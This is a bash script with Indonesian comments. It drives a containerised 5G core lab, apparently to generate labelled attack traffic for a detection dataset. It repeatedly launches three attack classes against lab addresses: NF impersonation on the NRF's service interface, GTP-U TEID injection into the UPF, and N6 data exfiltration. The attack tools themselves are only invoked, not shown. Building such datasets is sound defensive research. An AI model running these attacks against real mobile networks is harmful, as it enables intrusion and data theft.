#!/usr/bin/env bash
# ─────────────────────────────────────────────────────────────
# SERANGAN_BARU_VM.md — Grup 1 (langsung terproses NFM: UDP/TCP/N6).
# Kelas baru: sbi_nf_impersonation, gtpu_teid_injection, n6_exfiltration.
#
# "Episode independen" = port efemeral baru + variasi timing/parameter (sesuai
# pelajaran REVISI). Tiap run_scenario = satu WINDOW waktu; tiap window berisi
# SESSIONS flow berport-efemeral unik. WINDOWS window × SESSIONS flow = total flow
# per kelas (default 8×20 = 160 ≥ 100), tersebar di banyak window → bisa di-split.
#
# WAJIB: capture_start.sh (root) SEBELUM, capture_stop.sh SESUDAH, lalu
#        label_pcap.py --all. Guard subnet + --i-understand-lab-only via run_scenario.sh.
#
#   bash scenarios/newattacks/batch_group1.sh
# Env: WINDOWS(=8) SESSIONS(=20)   (kecilkan utk smoke-test, mis. WINDOWS=1 SESSIONS=3)
# ─────────────────────────────────────────────────────────────
set -euo pipefail
cd "$(dirname "$0")/../.."
RS="scripts/run_scenario.sh"; OK="--i-understand-lab-only"

NRF="172.22.0.20"; UPF_N3="172.23.0.30"; WEB="172.24.0.10"
ATT_CP="172.22.0.50"; UEMAL_N3="172.23.0.43"; UEMAL_TUN="10.45.0.9"
WINDOWS="${WINDOWS:-8}"; SESS="${SESSIONS:-20}"
jit(){ sleep $((1 + RANDOM % 3)); }

echo "== Grup1: ${WINDOWS} window × ${SESS} flow/ kelas =="
docker compose up -d attacker ue-mal >/dev/null 2>&1 || true
sleep 3
# Rute DN via uesimtun0 utk exfil N6 (idempoten)
docker exec ue-mal ip route replace 172.24.0.0/24 dev uesimtun0 >/dev/null 2>&1 || true

echo "###### sbi_nf_impersonation (attacker → NRF SBI/TLS) ######"
for i in $(seq 1 "$WINDOWS"); do
  bash "$RS" 4 "NB1-SBI-e${i}" sbi_nf_impersonation "$ATT_CP" "$NRF" SBI 60 $OK -- \
    docker exec -e SESSIONS="$SESS" -e ATK_IP="$ATT_CP" attacker \
      python3 /opt/attacker/tools/sbi_impersonate.py "$NRF" 7777
  jit
done

echo "###### gtpu_teid_injection (ue-mal → UPF N3) ######"
for i in $(seq 1 "$WINDOWS"); do
  bash "$RS" 2 "NB1-TEID-e${i}" gtpu_teid_injection "$UEMAL_N3" "$UPF_N3" N3 45 $OK -- \
    docker exec -e SESSIONS="$SESS" -e PKTS_PER_SESSION=6 ue-mal \
      python3 /opt/attacker/tools/gtpu_teid_inject.py "$UPF_N3" 10.45.0.2
  jit
done

echo "###### n6_exfiltration (ue-mal uesimtun0 → webserver DN) ######"
for i in $(seq 1 "$WINDOWS"); do
  bash "$RS" 2 "NB1-EXFIL-e${i}" n6_exfiltration "$UEMAL_TUN" "$WEB" N6 90 $OK -- \
    docker exec -e SESSIONS="$SESS" -e IFACE=uesimtun0 ue-mal \
      python3 /opt/attacker/tools/n6_exfil.py "$WEB"
  jit
done

echo "== Grup1 selesai. Lanjut batch_group2.sh, lalu capture_stop + label_pcap --all =="
